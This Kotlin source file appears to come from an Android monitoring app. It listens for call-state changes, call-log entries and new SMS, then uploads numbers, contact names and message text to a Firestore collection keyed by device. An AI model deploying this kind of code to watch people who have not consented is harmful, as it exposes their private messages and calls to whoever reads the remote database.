package com.nexus.androkiller.tracker

import android.content.ContentResolver
import android.content.ContentValues
import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Log
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.nexus.androkiller.model.NotificationRecord
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.util.UUID

class NotificationManager(private val context: Context) {

    private val firestore: FirebaseFirestore?
        get() = try {
            FirebaseFirestore.getInstance()
        } catch (_: Exception) {
            null
        }

    private val prefs = context.getSharedPreferences("tracker_prefs", Context.MODE_PRIVATE)
    private val scope = CoroutineScope(Dispatchers.IO + Job())
    private var callListener: PhoneStateListener? = null
    private var callLogObserver: ContentObserver? = null
    private var smsObserver: ContentObserver? = null
    private var isListening = false

    // In-memory dedup set — loaded from SharedPrefs on start so service restart
    // doesn't re-push already-seen notifications.
    private val recentNotifKeys = java.util.Collections.synchronizedSet(LinkedHashSet<String>())

    private val TAG = "NotificationManager"

    fun startListening(deviceId: String) {
        if (isListening) return
        isListening = true

        // Load persisted dedup keys from previous session so we don't re-push
        // notifications that were already sent before a service restart.
        val savedKeys = prefs.getStringSet("recent_notif_keys", emptySet()) ?: emptySet()
        recentNotifKeys.addAll(savedKeys)
        Log.d(TAG, "Loaded ${savedKeys.size} persisted dedup keys from SharedPrefs")

        // Initialize cursors from SharedPreferences or current latest ID to prevent dumping historical logs
        var savedCallId = prefs.getLong("last_call_log_id", -1L)
        if (savedCallId <= 0L) {
            savedCallId = getLatestCallLogId()
            prefs.edit().putLong("last_call_log_id", savedCallId).apply()
        }
        lastCallLogId = savedCallId

        var savedSmsId = prefs.getLong("last_sms_id", -1L)
        if (savedSmsId <= 0L) {
            savedSmsId = getLatestSmsId()
            prefs.edit().putLong("last_sms_id", savedSmsId).apply()
        }
        lastSmsId = savedSmsId

        startCallListener(deviceId)
        startCallLogObserver(deviceId)
        startSmsObserver(deviceId)
        Log.i(TAG, "Started real-time notification listeners for device: $deviceId (callId: $lastCallLogId, smsId: $lastSmsId)")
    }

    fun stopListening() {
        isListening = false
        callListener?.let {
            try {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                tm.listen(it, PhoneStateListener.LISTEN_NONE)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping call listener: ${e.message}")
            }
        }
        callListener = null

        callLogObserver?.let {
            try {
                context.contentResolver.unregisterContentObserver(it)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping call log observer: ${e.message}")
            }
        }
        callLogObserver = null

        smsObserver?.let {
            try {
                context.contentResolver.unregisterContentObserver(it)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping SMS observer: ${e.message}")
            }
        }
        smsObserver = null

        Log.i(TAG, "Stopped real-time notification listeners")
    }

    private fun getLatestCallLogId(): Long {
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls._ID),
                null,
                null,
                "${CallLog.Calls.DATE} DESC LIMIT 1"
            )
            cursor?.use {
                if (it.moveToFirst()) {
                    val idCol = it.getColumnIndex(CallLog.Calls._ID)
                    if (idCol != -1) return it.getLong(idCol)
                }
            }
        } catch (_: Exception) {}
        return 0L
    }

    private fun getLatestSmsId(): Long {
        try {
            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms._ID),
                null,
                null,
                "${Telephony.Sms.DATE} DESC LIMIT 1"
            )
            cursor?.use {
                if (it.moveToFirst()) {
                    val idCol = it.getColumnIndex(Telephony.Sms._ID)
                    if (idCol != -1) return it.getLong(idCol)
                }
            }
        } catch (_: Exception) {}
        return 0L
    }

    private fun startCallListener(deviceId: String) {
        callListener = object : PhoneStateListener() {
            var lastState = TelephonyManager.CALL_STATE_IDLE
            var incomingNumber: String? = null

            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                super.onCallStateChanged(state, phoneNumber)

                when (state) {
                    TelephonyManager.CALL_STATE_RINGING -> {
                        lastState = state
                        incomingNumber = phoneNumber
                        val name = getContactName(phoneNumber ?: "")
                        scope.launch {
                            pushNotification(
                                deviceId = deviceId,
                                type = "CALL_INCOMING",
                                title = "Incoming Call",
                                body = "Call from $name (${phoneNumber ?: "Unknown"})",
                                contactName = name,
                                contactNumber = phoneNumber ?: "",
                                priority = "MAX"
                            )
                        }
                    }
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                            // Call was answered
                            val name = getContactName(incomingNumber ?: "")
                            scope.launch {
                                pushNotification(
                                    deviceId = deviceId,
                                    type = "CALL_OUTGOING",
                                    title = "Call Answered",
                                    body = "Answered call from $name (${incomingNumber ?: "Unknown"})",
                                    contactName = name,
                                    contactNumber = incomingNumber ?: "",
                                    priority = "HIGH"
                                )
                            }
                        } else {
                            // Outgoing call initiated
                            val name = getContactName(phoneNumber ?: "")
                            scope.launch {
                                pushNotification(
                                    deviceId = deviceId,
                                    type = "CALL_OUTGOING",
                                    title = "Outgoing Call",
                                    body = "Calling $name (${phoneNumber ?: "Unknown"})",
                                    contactName = name,
                                    contactNumber = phoneNumber ?: "",
                                    priority = "HIGH"
                                )
                            }
                        }
                        lastState = state
                    }
                    TelephonyManager.CALL_STATE_IDLE -> {
                        if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                            // Missed call
                            val name = getContactName(incomingNumber ?: "")
                            scope.launch {
                                pushNotification(
                                    deviceId = deviceId,
                                    type = "CALL_MISSED",
                                    title = "Missed Call",
                                    body = "Missed call from $name (${incomingNumber ?: "Unknown"})",
                                    contactName = name,
                                    contactNumber = incomingNumber ?: "",
                                    priority = "HIGH"
                                )
                            }
                        }
                        lastState = state
                        incomingNumber = null
                    }
                }
            }
        }

        try {
            val hasPhoneState = androidx.core.content.ContextCompat.checkSelfPermission(
                context, android.Manifest.permission.READ_PHONE_STATE
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            if (hasPhoneState) {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                tm.listen(callListener!!, PhoneStateListener.LISTEN_CALL_STATE)
            } else {
                Log.w(TAG, "READ_PHONE_STATE not granted — skipping call state listener")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register call listener: ${e.message}", e)
        }
    }

    private fun startCallLogObserver(deviceId: String) {
        callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                scope.launch {
                    checkNewCallLog(deviceId)
                }
            }
        }

        try {
            context.contentResolver.registerContentObserver(
                CallLog.Calls.CONTENT_URI,
                true,
                callLogObserver!!
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register call log observer: ${e.message}", e)
        }
    }

    private var lastCallLogId = 0L

    private suspend fun checkNewCallLog(deviceId: String) {
        try {
            if (lastCallLogId <= 0L) {
                lastCallLogId = getLatestCallLogId()
                prefs.edit().putLong("last_call_log_id", lastCallLogId).apply()
                return
            }

            val projection = arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            )

            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                "${CallLog.Calls._ID} > ?",
                arrayOf(lastCallLogId.toString()),
                "${CallLog.Calls.DATE} DESC LIMIT 5"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val idCol = it.getColumnIndex(CallLog.Calls._ID)
                    val numCol = it.getColumnIndex(CallLog.Calls.NUMBER)
                    val nameCol = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    val typeCol = it.getColumnIndex(CallLog.Calls.TYPE)
                    val dateCol = it.getColumnIndex(CallLog.Calls.DATE)
                    val durCol = it.getColumnIndex(CallLog.Calls.DURATION)

                    var maxIdFound = lastCallLogId
                    do {
                        val id = if (idCol != -1) it.getLong(idCol) else 0L
                        val number = if (numCol != -1) it.getString(numCol) ?: "Unknown" else "Unknown"
                        val name = if (nameCol != -1) it.getString(nameCol) ?: "" else ""
                        val rawType = if (typeCol != -1) it.getInt(typeCol) else -1
                        val date = if (dateCol != -1) it.getLong(dateCol) else 0L
                        val duration = if (durCol != -1) it.getLong(durCol) else 0L

                        if (id > maxIdFound) {
                            maxIdFound = id
                        }

                        val typeStr = when (rawType) {
                            CallLog.Calls.INCOMING_TYPE -> "CALL_INCOMING"
                            CallLog.Calls.OUTGOING_TYPE -> "CALL_OUTGOING"
                            CallLog.Calls.MISSED_TYPE -> "CALL_MISSED"
                            CallLog.Calls.REJECTED_TYPE -> "CALL_MISSED"
                            else -> "CALL_INCOMING"
                        }

                        val contactName = name.ifBlank { number }
                        val title = when (typeStr) {
                            "CALL_INCOMING" -> "Incoming Call"
                            "CALL_OUTGOING" -> "Outgoing Call"
                            "CALL_MISSED" -> "Missed Call"
                            else -> "Call"
                        }
                        val priority = when (typeStr) {
                            "CALL_MISSED" -> "HIGH"
                            "CALL_INCOMING" -> "MAX"
                            else -> "HIGH"
                        }
                        val durFormatted = if (duration < 60) "${duration}s" else "${duration / 60}m ${duration % 60}s"
                        val body = when (typeStr) {
                            "CALL_INCOMING" -> "Call from $contactName ($number)"
                            "CALL_OUTGOING" -> "Called $contactName ($number) - $durFormatted"
                            "CALL_MISSED" -> "Missed call from $contactName ($number)"
                            else -> "Call from $contactName ($number)"
                        }

                        pushNotification(
                            deviceId = deviceId,
                            type = typeStr,
                            title = title,
                            body = body,
                            contactName = contactName,
                            contactNumber = number,
                            priority = priority
                        )
                    } while (it.moveToNext())

                    if (maxIdFound > lastCallLogId) {
                        lastCallLogId = maxIdFound
                        prefs.edit().putLong("last_call_log_id", lastCallLogId).apply()
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error checking new call log: ${e.message}")
        }
    }

    private fun startSmsObserver(deviceId: String) {
        smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                scope.launch {
                    checkNewSms(deviceId)
                }
            }
        }

        try {
            context.contentResolver.registerContentObserver(
                Telephony.Sms.CONTENT_URI,
                true,
                smsObserver!!
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register SMS observer: ${e.message}", e)
        }
    }

    private var lastSmsId = 0L

    private suspend fun checkNewSms(deviceId: String) {
        try {
            if (lastSmsId <= 0L) {
                lastSmsId = getLatestSmsId()
                prefs.edit().putLong("last_sms_id", lastSmsId).apply()
                return
            }

            val projection = arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
                Telephony.Sms.DATE
            )

            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                projection,
                "${Telephony.Sms._ID} > ?",
                arrayOf(lastSmsId.toString()),
                "${Telephony.Sms.DATE} DESC LIMIT 5"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val idCol = it.getColumnIndex(Telephony.Sms._ID)
                    val addrCol = it.getColumnIndex(Telephony.Sms.ADDRESS)
                    val bodyCol = it.getColumnIndex(Telephony.Sms.BODY)
                    val typeCol = it.getColumnIndex(Telephony.Sms.TYPE)
                    val dateCol = it.getColumnIndex(Telephony.Sms.DATE)

                    var maxIdFound = lastSmsId
                    do {
                        val id = if (idCol != -1) it.getLong(idCol) else 0L
                        val address = if (addrCol != -1) it.getString(addrCol) ?: "Unknown" else "Unknown"
                        val body = if (bodyCol != -1) it.getString(bodyCol) ?: "" else ""
                        val rawType = if (typeCol != -1) it.getInt(typeCol) else -1
                        val date = if (dateCol != -1) it.getLong(dateCol) else 0L

                        if (id > maxIdFound) {
                            maxIdFound = id
                        }

                        val typeStr = when (rawType) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "SMS_INCOMING"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "SMS_OUTGOING"
                            else -> "SMS_INCOMING"
                        }

                        val name = getContactName(address)
                        val title = if (typeStr == "SMS_INCOMING") "New SMS" else "SMS Sent"
                        val priority = if (typeStr == "SMS_INCOMING") "HIGH" else "DEFAULT"

                        pushNotification(
                            deviceId = deviceId,
                            type = typeStr,
                            title = title,
                            body = body.take(160),
                            contactName = name,
                            contactNumber = address,
                            priority = priority
                        )
                    } while (it.moveToNext())

                    if (maxIdFound > lastSmsId) {
                        lastSmsId = maxIdFound
                        prefs.edit().putLong("last_sms_id", lastSmsId).apply()
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error checking new SMS: ${e.message}")
        }
    }

    fun pushNotification(
        deviceId: String,
        type: String,
        title: String,
        body: String,
        contactName: String = "",
        contactNumber: String = "",
        priority: String = "DEFAULT"
    ) {
        // Build a deterministic key from the notification content.
        // Using body.take(80) avoids giant keys while still uniquely identifying the event.
        val notifKey = "$type|$contactNumber|${body.take(80)}"

        if (recentNotifKeys.contains(notifKey)) {
            Log.d(TAG, "Skipping duplicate notification: $notifKey")
            return
        }

        // Keep the in-memory set bounded at 200 entries
        if (recentNotifKeys.size >= 200) {
            val iterator = recentNotifKeys.iterator()
            repeat(20) { if (iterator.hasNext()) { iterator.next(); iterator.remove() } }
        }
        recentNotifKeys.add(notifKey)

        // Persist dedup keys to SharedPrefs so a service restart doesn't re-push.
        // Save only up to 150 most-recent keys to avoid huge pref file.
        val toSave = synchronized(recentNotifKeys) {
            recentNotifKeys.toList().takeLast(150).toSet()
        }
        prefs.edit().putStringSet("recent_notif_keys", toSave).apply()


        scope.launch {
            val db = firestore ?: return@launch
            try {
                // Deterministic document ID: SHA-256 hash of notifKey, hex-encoded (first 40 chars).
                // This guarantees set() is idempotent — calling it twice with same content
                // overwrites the existing doc instead of creating a new one.
                val docId = notifKey.toByteArray().let { bytes ->
                    val md = java.security.MessageDigest.getInstance("SHA-256")
                    md.digest(bytes).joinToString("") { "%02x".format(it) }.take(40)
                }

                val payload = hashMapOf(
                    "id" to docId,
                    "deviceId" to deviceId,
                    "type" to type,
                    "title" to title,
                    "body" to body,
                    "contactName" to contactName,
                    "contactNumber" to contactNumber,
                    "isRead" to false,
                    "priority" to priority,
                    "timestamp" to FieldValue.serverTimestamp()
                )

                // Using set() with deterministic docId — if document already exists (e.g. after
                // web app cleared and mobile re-pushes same event), it simply overwrites cleanly.
                db.collection("devices")
                    .document(deviceId)
                    .collection("notifications")
                    .document(docId)
                    .set(payload)

                Log.i(TAG, "Pushed notification to Firestore: $type - $title [docId=$docId]")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to push notification: ${e.message}", e)
            }
        }
    }

    fun pushGuardianMessageNotification(deviceId: String, message: String) {
        pushNotification(
            deviceId = deviceId,
            type = "GUARDIAN_MESSAGE",
            title = "Guardian Alert",
            body = message,
            priority = "MAX"
        )
    }

    fun pushSystemAlert(deviceId: String, title: String, body: String) {
        pushNotification(
            deviceId = deviceId,
            type = "SYSTEM_ALERT",
            title = title,
            body = body,
            priority = "HIGH"
        )
    }

    private fun getContactName(phoneNumber: String): String {
        if (phoneNumber.isBlank()) return "Unknown"
        try {
            val uri = Uri.withAppendedPath(CallLog.Calls.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
            val cursor = context.contentResolver.query(uri, arrayOf(CallLog.Calls.CACHED_NAME), null, null, null)
            cursor?.use {
                if (it.moveToFirst()) {
                    val nameCol = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    return if (nameCol != -1) it.getString(nameCol) ?: phoneNumber else phoneNumber
                }
            }
        } catch (_: Exception) {}
        return phoneNumber
    }

    companion object {
        fun initializeSmsCursor(context: Context): Long {
            var lastId = 0L
            try {
                val cursor = context.contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    arrayOf(Telephony.Sms._ID),
                    null,
                    null,
                    "${Telephony.Sms.DATE} DESC LIMIT 1"
                )
                cursor?.use {
                    if (it.moveToFirst()) {
                        val idCol = it.getColumnIndex(Telephony.Sms._ID)
                        lastId = if (idCol != -1) it.getLong(idCol) else 0L
                    }
                }
            } catch (_: Exception) {}
            return lastId
        }
    }
}